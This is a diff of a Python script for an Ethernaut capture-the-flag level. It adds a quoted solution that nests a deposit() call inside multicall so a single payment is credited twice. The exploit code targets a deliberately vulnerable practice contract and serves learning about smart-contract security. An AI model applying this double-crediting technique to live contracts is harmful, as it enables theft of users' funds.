@@ -62,3 +62,19 @@ def main():
 
     attack.attack({"from": player, "gas_limit": GAS_LIMIT, "value": VALUE})
     # print_storage(player, target)
+
+
+
+"""
+from Github solution (MikeSpa):
+
+# method id for the first deposit() call
+deposit_hash = web3.keccak(text="deposit()")[:4].hex() 
+# here we encode the calldata to call multicall with one argument, the deposit() call
+multicall_deposit_calldata = ETHERNAUT_INSTANCE.multicall.encode_input([deposit_hash]) 
+# we can now packed those two calldata together to have the final argument to give to multicall
+data = [deposit_hash, multicall_deposit_calldata]  
+
+ETHERNAUT_INSTANCE.multicall(data, {"from": player, "value": 0.02 ether})  # python
+
+"""
